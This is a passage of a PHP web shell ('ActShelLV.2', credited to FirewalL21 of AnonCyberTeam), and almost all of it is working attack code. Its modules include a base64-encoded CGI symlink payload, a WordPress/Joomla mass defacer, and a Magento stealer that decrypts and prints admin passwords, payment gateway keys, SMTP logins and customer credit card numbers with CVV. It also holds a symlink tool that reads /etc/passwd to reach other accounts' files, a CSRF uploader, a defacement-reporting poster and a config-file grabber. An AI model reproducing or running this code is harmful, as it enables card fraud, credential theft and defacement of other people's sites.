   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/data.txt', $_POST['man_data']);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i=1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.($i++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="#FDF105">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';if(!isset($_POST['form_action']) && !isset($_GET['mode'])){echo '<form action="" method="post"><table align=center><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf ('.(is_readable('/etc/named.conf')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd ('.(is_readable('/etc/passwd')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table align=center><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><center><input class="inputzbut" type="submit" value="Attack !" name="Submit"></center></form>';}$milaf_el_index = $_POST['defpage'];if($_POST['form_action'] == 1) {if($_POST['mode']==1) { exec_mode_1($milaf_el_index); }if($_POST['mode']==2) { exec_mode_2($milaf_el_index); }if($_POST['mode']==3) { exec_mode_3($milaf_el_index); }}if($_GET['mode']==1) { exec_mode_1($milaf_el_index); }echo '<script data-cfasync="false" src="/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js"></script></body></html>';
   }
}
elseif($_GET['do'] == 'magen') {
echo'
<div id="page-wrap">  
<center>  
<br>  
<FORM action=""  method="post">  
<div align="center">[M A G E N T O] - Stealing Information<br>  
<div align="center">Coder: FirewalL21<br>  
<input type="hidden" name="form_action" value="2">  
</div>  
</div>  
';  


if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){  
    $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');  
    if(isset($xml->global->resources->default_setup->connection)) {  
       $connection = $xml->global->resources->default_setup->connection;  
       $prefix = $xml->global->resources->db->table_prefix;  
       $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1  
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';  
         
       try {  
           $app = Mage::app('default');  
           Mage::getSingleton('core/session', array('name'=>'frontend'));  
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}  

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){  
           print("Could not connect: " . mysql_error());  
       }  
       mysql_select_db($connection->dbname);  
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n";  

    $crypto = new Varien_Crypt_Mcrypt();  
    $crypto->init($key);  

    //=========================================================================================================  
    $query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");  
    if (!$query){  
          echo "<center><b>Gagal</b></center>";  
    }else{  
            $site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));  
          echo'<br><br>  
                ====================================================================<br>  
                                [ Admin FROM website : '.$site['website'].'] <br>  
                ====================================================================<br>';  
    }  
    echo "  
    <table border='1' align='center' >  
    <tr>  
    <td>id</td>  
    <td>firstname</td>  
    <td>lastname</td>  
    <td>email</td>  
    <td>username</td>  
    <td>password</td>  
    </tr>";  
        while($vx = mysql_fetch_array($query)) {  
        $no = 1;  
        $user_id = $vx['user_id'];  
        $username = $vx['username'];  
        $password = $vx['password'];  
        $email = $vx['email'];  
        $firstname = $vx['firstname'];  
        $lastname = $vx['lastname'];  
        echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>";  
        }   
    echo "</table><br>";  
    //=========================================================================================================  
    $query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");  
    if(mysql_num_rows($query) != 0){  
        if (!$query){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Authorizenet ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            while($vx = mysql_fetch_array($query)) {  
            $user = $crypto->decrypt($vx['user']);  
            $pass = $crypto->decrypt($vx['pass']);  

              
            echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
            $no++;  
            }   
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");  
    if(mysql_num_rows($query_smtp) != 0){  
        if (!$query_smtp){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ SMTP ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>host</td>          
        <td>port</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($rows = mysql_fetch_array($query_smtp)) {  
                $smtphost = $rows[0];  
                $smtpport = $rows[1];  
                $smtpuser = $rows[2];  
                $smtppass = $rows[3];  
                echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>";  
                $no++;  
            }  
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");  
    $query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){  
          echo'<br><br>  
                ====================================================================<br>  
                                [ Credit Card ] <br>  
                ====================================================================<br>';  
            echo "  
            <table border='1' align='left' >  
            <tr>  
            <td>no</td>  
            <td>Date</td>  
            <td>Credit Owner</td>  
            <td>method</td>  
            <td>Credit Number</td>  
            <td>Credit Exp</td>  
            <td>CVV</td>  
            <td>Address</td>  
            </tr>";  
                $no = 1;  
                $batas = 0;  
                while($vx = mysql_fetch_array($query)){  
                $date = $vx['updated_at'];  
                $cc_owner = $vx['cc_owner'];  
                $method = $vx['method'];  
                $cc_number_enc = $crypto->decrypt($vx['cc_number_enc']);  
                $exp = $vx['exp'];          
                $cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);      
                $Billing_Address = $vx['Billing Address'];  
                echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>";  
                $batas = $no++;  
                }  
                  
                while($vx2 = mysql_fetch_array($query2)){  
                    $batas +=1;  
                $cc_owner = $vx2['cc_owner'];  
                $method = $vx2['method'];  
                $cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']);  
                $exp = $vx2['exp'];          
                $cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']);  
                $Billing_Address = $vx2['Billing Address'];  
                echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>";  
                 $batas++;  
                }       
                  
            echo "</table><br>";      
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");  
    $query2 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");  
      
      
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){  
        if (!$query){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Customer ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($vx = mysql_fetch_array($query)) {  
                $user = $vx['email'];  
                $pass = $vx['value'];  
                echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
                $batas = $no++;  
            }   
              
            if(mysql_num_rows($query2) != 0 && ($query2)){  
                while($vx2 = mysql_fetch_array($query2)){  
                    $user = $vx2['customer_email'];  
                    $pass = $crypto->decrypt($vx2['password_hash']);  
                    if(!empty($user) && !empty($pass)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin   
                        $batas +=1;  
                        echo "<tr><pre><td>$batas</td><td>$user</td><td>$pass</td></pre></tr>";  
                        $batas++;  
                    }  
                }                  
            }  
          
        echo "</table><br>";  
    }  
    //=========================================================================================================  
  }  
}  
function save($format,$data){  
    $fp = fopen($format, 'a');  
    fwrite($fp, $data);  
    fclose($fp);  
}  
function cekbase64($string){   
        $decoded = base64_decode($string, true);  
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;  
        if(!base64_decode($string, true)) return false;  
        if(base64_encode($decoded) != $string) return false;  
        return true;//nilai return 1 jika true  
    }  
//----untuk decode password ---/  
class Varien_Crypt_Mcrypt{  
    /**  
     * Constuctor  
     *  
     * @param array $data  
     */  
    public function __construct()  
    {  
    }  

    /**  
     * Initialize mcrypt module  
     *  
     * @param string $key cipher private key  
     * @return Varien_Crypt_Mcrypt  
     */  
    public function init($key)  
    {  
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');  
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);  
        $maxKeySize = mcrypt_enc_get_key_size($this->handler);  

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) {  
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize);  
            return null;  
        }  

        mcrypt_generic_init($this->handler, $key, $iv);  

        return $this;  
    }  

    /**  
     * Encrypt data  
     *  
     * @param string $data source string  
     * @return string  
     */  
    public function encrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return base64_encode(mcrypt_generic($this->handler, $data));  
    }  

    /**  
     * Decrypt data  
     *  
     * @param string $data encrypted string  
     * @return string  
     */  
    public function decrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return mdecrypt_generic($this->handler, base64_decode($data));  
    }  
          
   
    /**  
     * Desctruct cipher module  
     *  
     */  
    public function __destruct()  
    {  
        if ($this->handler) {  
            $this->_reset();  
        }  
    }  

    protected function _reset()  
    {  
        mcrypt_generic_deinit($this->handler);  
        mcrypt_module_close($this->handler);  
    }  
}
}
elseif($_GET['do'] == 'hash') {
 $submit = $_POST['enter'];
   
 if (isset($submit)) {
     
   $pass = $_POST['password']; // password
      
  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 
     $hash = md5($pass); // md5 hash #1
     
   $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
   
     $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
     
   $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
     
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
       
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
     
   
    }
    echo '<form action="" method="post"><b> ';
  
  echo '<center><h2><b>-=[ Password Hash]=-</b></h2></center></tr>';
 
   echo ' <b>masukan kata yang ingin di encrypt:</b> ';
  
  echo ' <input class="inputz" type="text" name="password" size="40" />';
 
   echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
  
  echo ' <br>';
    echo ' Hasil Hash</th></center></tr>';
 
   echo ' Original Password  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>';
 
   echo ' MD5  <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
    
echo ' MD4  <input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';
    
echo ' MD5 with Salt  <input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';
  
  echo ' MD5 with Salt & Sha1  <input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';

    echo ' Sha1  <input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';
 
   echo ' Sha256  <input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';
 
   echo ' Sha1 with Salt  <input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';
 
   echo ' Sha1 with Salt & MD5  <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br><br>';

}
elseif($_GET['do'] == 'csrfup')
{   
echo '<html>
<center><h1 style="font-size:33pxr By IndoXPloit<br>Recoded by FirewalL21</h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
<script data-cfasync='false' src='/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js'></script></html>";
}

}
elseif($_GET['do'] == 'about') {
    
    echo '<center>ActShelLV.2<hr>Coded Shell By FirewalL21 ->  Untuk Kelengkapan Tools bisa lihat dibagian bawah :D
    Terimakasih untuk orang yang membantu dalam pembuatan shell ini . Tanpa kalian shell ini tidak akan jadi .:v Untuk Tools Shell ini sebagian Fungsionnya kita ambil dari shell yang sudah ada. Dan selebihnya itu hasil karya AnonCyberTeam sendiri .D Spesial Thanks [ Mr.TeanWap - AnonCyberTeam ] [ l0c4lh3artz - IndoXploit ] and [ Yuss - N45HT ] <br>Mampir ke blogspot act yukk Visit <a href="http://www.anoncyberteam.org/">Here</a>';
    
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("act_sym",0777);
@chdir("act_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex FirewalL21.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/act_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("act_sym",0777);
@chdir("act_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Firewall21.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/act_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("act_sym",0777);@chdir("act_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex FirewalL21.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/act_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='hekel' size='50' value'FirewalL21'><br>
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='Anonymous Cyber Team'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
        <input type='submit' name='go' value='Submit' style='width: 450px;'>
        </form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['do'] == 'config') {
    if($_POST){
        $passwd = $_POST['passwd'];
        mkdir("act_config", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("act_config/.htaccess","w");
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach($user_config[1] as $user_act) {
            $user_config_dir = "/home/$user_act/public_html/";
            if(is_readable($user_config_dir)) {
                $grab_config = array(
                                        "/home/$user_act/.my.cnf" => "cpanel",
                    "/home/$user_act/.accesshash" => "WHM-accesshash",
                    "/home/$user_act/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home/$user_act/public_html/config/koneksi.php" => "Lokomedia",
                    "/home/$user_act/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home/$user_act/public_html/clientarea/configuration.php" => "WHMCS",              
                    "/home/$user_act/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home/$user_act/public_html/forum/config.php" => "phpBB",
                    "/home/$user_act/public_html/sites/default/settings.php" => "Drupal",
                    "/home/$user_act/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home/$user_act/public_html/app/etc/local.xml" => "Magento",
                    "/home/$user_act/public_html/admin/config.php" => "OpenCart",
                    "/home/$user_act/public_html/slconfig.php" => "Sitelok",
                    "/home/$user_act/public_html/application/config/database.php" => "Ellislab",                    
                    "/home/$user_act/public_html/whm/configuration.php" => "WHMCS",
                    "/home/$user_act/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home/$user_act/public_html/central/configuration.php" => "WHM Central",
                    "/home/$user_act/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home/$user_act/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home/$user_act/public_html/submitticket.php" => "WHMCS",                                      
                    "/home/$user_act/public_html/configuration.php" => "Joomla",                    
                    "/home/$user_act/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home/$user_act/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home/$user_act/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",       
                    "/home/$user_act/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home/$user_act/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home/$user_act/public_html/home/configuration.php" => "JoomlaHome",
                    "/home/$user_act/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home/$user_act/public_html/New/configuration.php" => "JoomlaNew",
                    "/home/$user_act/public_html/new/configuration.php" => "JoomlaNew",
                    "/home/$user_act/public_html/News/configuration.php" => "JoomlaNews",
                    "/home/$user_act/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home/$user_act/public_html/news/configuration.php" => "JoomlaNews",
                    "/home/$user_act/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home/$user_act/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home/$user_act/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home/$user_act/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home/$user_act/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home/$user_act/public_html/main/configuration.php" => "JoomlaMain",
                    "/home/$user_act/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home/$user_act/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home/$user_act/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home/$user_act/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home/$user_act/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home/$user_act/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home/$user_act/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home/$user_act/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home/$user_act/public_html/BETA/configuration.php" => "JoomlaBeta",
